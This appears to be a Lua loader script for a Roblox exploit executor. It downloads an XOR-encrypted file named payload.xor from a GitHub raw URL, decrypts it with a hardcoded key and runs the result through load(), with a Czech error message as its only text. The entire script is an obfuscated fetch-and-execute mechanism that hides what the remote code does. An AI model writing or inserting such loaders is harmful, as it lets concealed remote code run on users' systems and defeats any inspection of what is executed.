local key = "aVysHSYBTqIuFaQW"

local function decrypt(data, key)
    local res = {}
    for i = 1, #data do
        local k = key:byte((i - 1) % #key + 1)
        local c = data:byte(i)
        res[i] = string.char(bit32.band(bit32.bxor(c, k), 0xFF))
    end
    return table.concat(res)
end

local url = "https://raw.githubusercontent.com/janhub1/scriptsurvivelava1/main/payload.xor"

local success, encrypted = pcall(function()
    return game:HttpGet(url, true)
end)

if not success then
    warn("Stahování selhalo: " .. tostring(encrypted))
    return
end

local decoded = decrypt(encrypted, key)
load(decoded)()
